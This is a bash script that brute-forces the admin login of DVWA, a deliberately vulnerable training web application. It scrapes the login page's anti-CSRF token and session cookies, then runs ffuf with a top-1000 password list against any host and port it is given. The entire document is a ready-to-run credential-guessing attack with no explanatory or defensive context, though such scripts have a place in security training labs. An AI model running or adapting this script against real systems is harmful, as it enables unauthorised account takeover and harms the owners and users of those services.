#!/usr/bin/env bash
if [ "${#}" -eq 2 ]; then
	TARGET="${1}"
    PORT="${2}"
    # DVWA login needs a session and its anti-CSRF token; the token only changes when login.php is rendered
    TOKEN=$(curl -s -c /tmp/cookies "http://${TARGET}:${PORT}/login.php" | grep -o "name='user_token' value='[0-9a-f]*'" | cut -d"'" -f4)
    COOKIE=$(awk '$6=="PHPSESSID" || $6=="security" {printf "%s=%s; ", $6, $7}' /tmp/cookies)
    /tmp/ffuf -w /tmp/Pwdb_top-1000.txt -X POST -H "Content-Type: application/x-www-form-urlencoded" -b "${COOKIE}" -d "username=admin&password=FUZZ&Login=Login&user_token=${TOKEN}" -u http://"${TARGET}:${PORT}"/login.php -fc 401
fi
